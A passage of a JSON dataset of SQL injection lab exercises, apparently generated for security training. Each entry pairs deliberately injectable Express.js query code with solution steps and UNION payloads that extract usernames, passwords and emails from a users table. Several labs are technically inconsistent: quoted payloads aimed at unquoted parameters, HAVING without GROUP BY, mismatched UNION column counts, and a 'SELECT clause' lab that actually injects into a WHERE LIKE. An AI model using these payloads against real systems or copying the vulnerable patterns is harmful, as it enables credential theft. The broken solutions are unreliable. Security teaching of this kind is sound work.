      "Use Postman to send a request to the filter products endpoint.",
      "Inject SQL payloads into the 'price' parameter, such as '100' HAVING 1=1 UNION SELECT username, password FROM users--.",
      "Check for any unauthorized data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of sensitive user data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/filter-products', (req, res) => {\n  const price = req.query.price;\n  const query = `SELECT * FROM products HAVING price = ${price}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "100' HAVING 1=1 UNION SELECT username, password FROM users--",
      "100' HAVING 1=1 UNION SELECT id, password FROM users--",
      "100' HAVING 1=1 UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in WHERE Clause",
    "Lab Description": "The banking portal allows users to filter account details by account number, but fails to sanitize input in the WHERE clause. To solve: Exploit the WHERE clause to retrieve sensitive data from the database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the filter account details endpoint.",
      "Inject SQL payloads into the 'account_number' parameter, such as '12345' OR '1'='1'.",
      "Check for any unauthorized data leakage from the accounts table.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of sensitive data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/account-details', (req, res) => {\n  const accountNumber = req.query.account_number;\n  const query = `SELECT * FROM accounts WHERE account_number = '${accountNumber}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "12345' OR '1'='1",
      "12345' OR '1'='1' UNION SELECT username, password FROM users--",
      "12345' OR '1'='1' UNION SELECT id, password FROM users--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in JOIN Clause",
    "Lab Description": "The API Gateway allows filtering users by role, but the query is vulnerable in the JOIN clause. To solve: Exploit the JOIN clause to retrieve unauthorized user data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send a request to the filter users endpoint.",
      "Inject SQL payloads into the 'role' parameter, such as 'admin' JOIN users ON 1=1 UNION SELECT username, password FROM users--.",
      "Check for any unauthorized data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of sensitive user data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/filter-users', (req, res) => {\n  const role = req.query.role;\n  const query = `SELECT * FROM users JOIN roles ON users.role = roles.name WHERE role = '${role}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "' JOIN users ON 1=1 UNION SELECT username, password FROM users--",
      "' JOIN users ON 1=1 UNION SELECT id, password FROM users--",
      "' JOIN users ON 1=1 UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in ORDER BY Clause",
    "Lab Description": "The CMS allows users to sort articles by date, but the query is vulnerable in the ORDER BY clause. To solve: Exploit the ORDER BY clause to retrieve unauthorized data from the database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the sort articles endpoint.",
      "Inject SQL payloads into the 'date' parameter, such as '2021-01-01' ORDER BY 1 UNION SELECT username, password FROM users--.",
      "Check for any unauthorized data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of sensitive user data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/sort-articles', (req, res) => {\n  const date = req.query.date;\n  const query = `SELECT * FROM articles ORDER BY ${date}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "2021-01-01' ORDER BY 1 UNION SELECT username, password FROM users--",
      "2021-01-01' ORDER BY 2 UNION SELECT id, password FROM users--",
      "2021-01-01' ORDER BY 3 UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in GROUP BY Clause",
    "Lab Description": "The banking portal allows users to filter transactions by month, but the query is vulnerable in the GROUP BY clause. To solve: Exploit the GROUP BY clause to retrieve unauthorized data from the database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the filter transactions endpoint.",
      "Inject SQL payloads into the 'month' parameter, such as 'January' GROUP BY 1 UNION SELECT username, password FROM users--.",
      "Check for any unauthorized data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of sensitive data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/filter-transactions', (req, res) => {\n  const month = req.query.month;\n  const query = `SELECT * FROM transactions GROUP BY ${month}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "January' GROUP BY 1 UNION SELECT username, password FROM users--",
      "January' GROUP BY 2 UNION SELECT id, password FROM users--",
      "January' GROUP BY 3 UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in HAVING Clause",
    "Lab Description": "The IoT dashboard allows users to filter devices by status, but the query is vulnerable in the HAVING clause. To solve: Exploit the HAVING clause to retrieve unauthorized user data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the filter devices endpoint.",
      "Inject SQL payloads into the 'status' parameter, such as 'active' HAVING 1=1 UNION SELECT username, password FROM users--.",
      "Check for any unauthorized data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of sensitive data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/filter-devices', (req, res) => {\n  const status = req.query.status;\n  const query = `SELECT * FROM devices HAVING status = '${status}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "active' HAVING 1=1 UNION SELECT username, password FROM users--",
      "active' HAVING 1=1 UNION SELECT id, password FROM users--",
      "active' HAVING 1=1 UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in SELECT Clause",
    "Lab Description": "The API Gateway allows filtering products by name, but fails to sanitize input in the SELECT clause. To solve: Exploit the SELECT clause to retrieve unauthorized data from the database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a request to the filter products endpoint.",
      "Inject SQL payloads into the 'name' parameter, such as 'laptop' UNION SELECT username, password FROM users--.",
      "Check for any unauthorized data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of sensitive user data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/filter-products', (req, res) => {\n  const name = req.query.name;\n  const query = `SELECT * FROM products WHERE name LIKE '%${name}%'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "laptop' UNION SELECT username, password FROM users--",
      "laptop' UNION SELECT id, password FROM users--",
      "laptop' UNION SELECT email, username FROM users--"
    ]
  }
]